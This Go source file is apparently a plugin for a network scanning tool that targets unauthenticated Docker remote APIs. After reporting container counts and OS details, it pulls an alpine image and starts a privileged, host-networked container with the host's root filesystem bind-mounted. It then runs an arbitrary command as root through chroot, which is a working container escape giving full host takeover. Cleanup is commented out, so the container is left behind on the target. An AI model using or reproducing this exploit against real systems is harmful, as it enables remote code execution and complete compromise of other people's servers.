package plugins

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"time"

	"github.com/404tk/lazyscan/common"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/docker/docker/client"
)

var containerName = "remote2375"

func DockerRemote(info *common.HostInfo) error {
	endpoint := fmt.Sprintf("%s:%s", info.Host, info.Port)
	cli, err := client.NewClientWithOpts(
		client.FromEnv,
		client.WithAPIVersionNegotiation(),
		client.WithHost("tcp://"+endpoint))
	defer cli.Close()
	if err != nil {
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
	res, err := cli.Info(ctx)
	defer cancel()
	if err != nil {
		return err
	}
	result := fmt.Sprintf("[%s:%s] may be docker remote api unauth, there are %d containers, %d images.",
		info.Host, info.Port, res.Containers, res.Images)
	result += fmt.Sprintf("\nOS info: %s %s %s %s",
		res.OperatingSystem, res.Architecture, res.KernelVersion, res.OSVersion)
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host:   info.Host,
			Port:   info.Port,
			Unauth: true,
		}
		info.Queue.Push(vuln)
	}
	cmd := info.Command.UnixCommand
	err = dockerEscape(cli, cmd)
	return err
}

func dockerEscape(cli *client.Client, cmd string) error {
	// 拉取镜像
	reader, err := cli.ImagePull(context.Background(), "docker.io/library/alpine", types.ImagePullOptions{})
	if err != nil {
		return err
	}
	defer reader.Close()
	io.Copy(os.Stdout, reader)
	// 创建容器
	_, err = cli.ContainerCreate(context.TODO(),
		&container.Config{
			Image: "alpine",
			Tty:   true,
		},
		&container.HostConfig{
			Privileged:  true,
			NetworkMode: "host",
			Mounts:      []mount.Mount{{Type: mount.TypeBind, Source: "/", Target: "/tmp/docker"}},
		},
		nil, nil, containerName)
	// 启动容器
	err = cli.ContainerStart(context.TODO(), containerName, types.ContainerStartOptions{})
	// 命令执行
	err = dockerExec(context.TODO(), cli, containerName, fmt.Sprintf("chroot /tmp/docker sh -c \"%s\"", cmd))
	// 停止容器
	// cli.ContainerStop(context.TODO(), containerName, nil)
	// 删除容器
	// cli.ContainerRemove(context.TODO(), containerName, types.ContainerRemoveOptions{Force: true})
	return err
}

func dockerExec(ctx context.Context, cli *client.Client, container string, cmd string) error {
	resp, err := cli.ContainerExecCreate(ctx, container, types.ExecConfig{
		// 默认使用root账户
		User: "root",
		Cmd:  []string{"/bin/sh", "-c", cmd},
	})
	if err == nil {
		_, err = cli.ContainerExecAttach(ctx, resp.ID, types.ExecStartCheck{})
	}
	return err
}
